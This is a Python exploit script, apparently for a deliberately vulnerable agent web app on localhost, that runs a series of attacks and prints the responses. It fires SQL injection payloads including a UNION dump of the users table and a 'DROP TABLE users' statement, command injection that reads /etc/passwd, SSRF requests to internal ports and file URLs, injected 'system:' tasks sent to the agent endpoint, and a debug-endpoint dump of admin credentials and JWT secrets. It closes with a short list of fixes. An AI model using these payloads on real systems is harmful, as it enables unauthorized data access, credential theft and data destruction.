#!/usr/bin/env python3
"""
Exploitation Demonstration Script
This script demonstrates how to exploit the vulnerabilities in the vulnerable agentic agent.
FOR EDUCATIONAL PURPOSES ONLY.
"""

import requests
import json
import base64

class VulnerableAgentExploiter:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_sql_injection(self):
        """Demonstrate SQL injection attacks"""
        print("üîç Testing SQL Injection Attacks")
        print("=" * 50)
        
        # Test 1: Basic SQL injection to get all data
        payload = "1 OR 1=1"
        response = requests.get(f"{self.base_url}/api/user_data?user_id={payload}")
        print(f"1. Basic SQL Injection (1 OR 1=1):")
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:200]}...")
        print()
        
        # Test 2: Union attack to get user table
        payload = "1 UNION SELECT * FROM users --"
        response = requests.get(f"{self.base_url}/api/user_data?user_id={payload}")
        print(f"2. Union Attack (1 UNION SELECT * FROM users --):")
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:200]}...")
        print()
        
        # Test 3: Drop table attack (will cause error)
        payload = "1; DROP TABLE users; --"
        response = requests.get(f"{self.base_url}/api/user_data?user_id={payload}")
        print(f"3. Drop Table Attack (1; DROP TABLE users; --):")
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:200]}...")
        print()
    
    def test_command_injection(self):
        """Demonstrate command injection attacks"""
        print("üîç Testing Command Injection Attacks")
        print("=" * 50)
        
        # Test 1: Basic command execution
        payload = {"command": "whoami"}
        response = requests.post(f"{self.base_url}/api/execute", json=payload)
        print(f"1. Basic Command (whoami):")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Result: {result.get('result', 'N/A')}")
        print()
        
        # Test 2: Multiple commands
        payload = {"command": "ls -la; cat /etc/passwd"}
        response = requests.post(f"{self.base_url}/api/execute", json=payload)
        print(f"2. Multiple Commands (ls -la; cat /etc/passwd):")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Result: {result.get('result', 'N/A')[:200]}...")
        print()
        
        # Test 3: System information
        payload = {"command": "uname -a"}
        response = requests.post(f"{self.base_url}/api/execute", json=payload)
        print(f"3. System Info (uname -a):")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Result: {result.get('result', 'N/A')}")
        print()
    
    def test_ssrf(self):
        """Demonstrate SSRF attacks"""
        print("üîç Testing SSRF Attacks")
        print("=" * 50)
        
        # Test 1: Access internal debug endpoint
        payload = {"url": f"{self.base_url}/api/debug"}
        response = requests.post(f"{self.base_url}/api/fetch_url", json=payload)
        print(f"1. Internal Debug Access:")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Content: {result.get('content', 'N/A')[:200]}...")
        print()
        
        # Test 2: Port scanning attempt
        payload = {"url": "http://127.0.0.1:22"}
        response = requests.post(f"{self.base_url}/api/fetch_url", json=payload)
        print(f"2. Port Scanning (127.0.0.1:22):")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Error: {result.get('error', 'N/A')}")
        print()
        
        # Test 3: File reading attempt
        payload = {"url": "file:///etc/passwd"}
        response = requests.post(f"{self.base_url}/api/fetch_url", json=payload)
        print(f"3. File Reading (file:///etc/passwd):")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Error: {result.get('error', 'N/A')}")
        print()
    
    def test_agent_execution(self):
        """Demonstrate agent task execution vulnerabilities"""
        print("üîç Testing Agent Task Execution Vulnerabilities")
        print("=" * 50)
        
        # Test 1: System command through agent
        payload = {"task": "system:whoami", "user_id": 1}
        response = requests.post(f"{self.base_url}/api/agent/execute", json=payload)
        print(f"1. System Command via Agent:")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Result: {result.get('result', 'N/A')}")
        print()
        
        # Test 2: SQL injection through agent
        payload = {"task": "sql:SELECT * FROM users", "user_id": 1}
        response = requests.post(f"{self.base_url}/api/agent/execute", json=payload)
        print(f"2. SQL Query via Agent:")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Result: {result.get('result', 'N/A')}")
        print()
        
        # Test 3: Encryption through agent
        payload = {"task": "encrypt:secret_data", "user_id": 1}
        response = requests.post(f"{self.base_url}/api/agent/execute", json=payload)
        print(f"3. Weak Encryption via Agent:")
        print(f"   Status: {response.status_code}")
        result = response.json()
        print(f"   Result: {result.get('result', 'N/A')}")
        print()
    
    def test_debug_exposure(self):
        """Demonstrate exposed debug information"""
        print("üîç Testing Debug Information Exposure")
        print("=" * 50)
        
        response = requests.get(f"{self.base_url}/api/debug")
        print(f"Debug Endpoint:")
        print(f"   Status: {response.status_code}")
        result = response.json()
        
        print(f"   Database Path: {result.get('database_path', 'N/A')}")
        print(f"   Admin Credentials: {result.get('admin_credentials', 'N/A')}")
        print(f"   JWT Secret: {result.get('jwt_secret', 'N/A')}")
        print(f"   Secret Key: {result.get('secret_key', 'N/A')}")
        print(f"   Upload Directory: {result.get('upload_directory', 'N/A')}")
        print()
        
        # Show server info
        server_info = result.get('server_info', {})
        print(f"   Python Version: {server_info.get('python_version', 'N/A')}")
        print(f"   Working Directory: {server_info.get('working_directory', 'N/A')}")
        print()
    
    def test_weak_authentication(self):
        """Demonstrate weak authentication"""
        print("üîç Testing Weak Authentication")
        print("=" * 50)
        
        # Test with weak credentials
        payload = {"username": "admin", "password": "admin123"}
        response = requests.post(f"{self.base_url}/login", data=payload)
        print(f"1. Weak Password Login:")
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:100]}...")
        print()
        
        # Test with wrong credentials
        payload = {"username": "admin", "password": "wrong_password"}
        response = requests.post(f"{self.base_url}/login", data=payload)
        print(f"2. Wrong Password Login:")
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:100]}...")
        print()
    
    def run_all_exploits(self):
        """Run all exploitation demonstrations"""
        print("üöÄ Starting Vulnerability Exploitation Demonstrations")
        print("‚ö†Ô∏è  FOR EDUCATIONAL PURPOSES ONLY")
        print("=" * 60)
        print()
        
        try:
            self.test_debug_exposure()
            self.test_weak_authentication()
            self.test_sql_injection()
            self.test_command_injection()
            self.test_ssrf()
            self.test_agent_execution()
            
            print("‚úÖ All exploitation demonstrations completed!")
            print()
            print("üìö Educational Summary:")
            print("- SQL Injection: Allows unauthorized data access")
            print("- Command Injection: Allows system command execution")
            print("- SSRF: Allows internal service access")
            print("- Weak Authentication: Easy to bypass")
            print("- Debug Exposure: Reveals sensitive information")
            print("- Agent Vulnerabilities: Multiple attack vectors")
            print()
            print("üîß Security Recommendations:")
            print("- Use parameterized queries for SQL")
            print("- Validate and sanitize all inputs")
            print("- Implement proper authentication")
            print("- Disable debug mode in production")
            print("- Use strong encryption algorithms")
            print("- Implement proper access controls")
            
        except Exception as e:
            print(f"‚ùå Error during exploitation: {e}")

if __name__ == "__main__":
    exploiter = VulnerableAgentExploiter()
    exploiter.run_all_exploits() 